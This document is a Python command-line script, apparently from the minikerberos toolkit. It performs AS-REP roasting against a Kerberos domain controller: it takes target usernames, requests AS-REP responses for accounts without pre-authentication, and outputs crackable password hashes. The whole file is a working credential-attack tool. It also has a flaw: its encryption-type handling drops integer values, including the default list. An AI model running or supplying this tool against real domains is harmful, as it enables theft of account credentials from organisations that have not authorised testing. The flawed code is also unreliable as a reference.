import logging
import asyncio
import traceback
import pathlib
from minikerberos.common.target import KerberosTarget
from minikerberos.security import asreproast as asreproast_sec
from typing import List

async def asreproast(kerberos_server:str, users:List[str], domain:str, out_file:str = None, etypes:List[int] = [23,17,18]):
	try:
		results_ok = []
		results_err = []
		cu = KerberosTarget(ip=kerberos_server)

		if isinstance(users, list) is False:
			users = [users]
		
		users_final = []
		for user in users:
			if isinstance(user, str):
				if pathlib.Path(user).exists():
					with open(user, 'r') as f:
						users_final.extend(f.read().splitlines())
				else:
					users_final.append(user)
		
		
		if isinstance(etypes, list) is False:
			etypes = [etypes]
		
		etypes_final = []
		for etype in etypes:
			if isinstance(etype, str):
				etypes_final.extend([int(x) for x in etype.split(',')])
			
			if isinstance(etypes, int):
				etypes_final.append(etype)
		
		etypes = etypes_final
		users = users_final
		if domain is None:
			raise Exception('No domain specified')
		
		users_nodomain = []
		for username in users:
			if username.find('@') != -1:
				users_nodomain.append(username.split('@')[0])
			else:
				users_nodomain.append(username)
		
		username = None
		async for username, res, err in asreproast_sec(cu, users_nodomain, domain, override_etype=etypes):
			if err is not None:
				results_err.append((username, err))
				continue
			results_ok.append((username, res))	

		
		if out_file is not None:
			with open(out_file, 'w', newline='') as f:
				for _, result in results_ok:
					f.write(result + '\r\n')
		
		for username, err in results_err:
			print('%s error: %s' % (username, err))
		for _, result in results_ok:
			print(result)
		
	except Exception as e:
		traceback.print_exc()

async def amain():
	import argparse
	
	parser = argparse.ArgumentParser(description='Asreproast', formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument('kerberos_server', help='Kerberos server IP or hostname')
	parser.add_argument('domain', help='Realm. Use this if you specify username in "spn" field')
	parser.add_argument('users', nargs ='*', help='User/username to kerberoast. Can be a file with usernames, or a single username.')
	parser.add_argument('-e', '--etypes', default='23,17,18', help='Encryption types to use. Default: 23,17,18')
	parser.add_argument('-o', '--out-file', help='Write results to this file instead of printing them')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	
	args = parser.parse_args()
	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)

	if len(args.users) == 0:
		print('Please provide users to kerberoast')
		return
	
	await asreproast(args.kerberos_server, args.users, args.domain, args.out_file, args.etypes)

def main():
	asyncio.run(amain())
	
if __name__ == '__main__':
	main()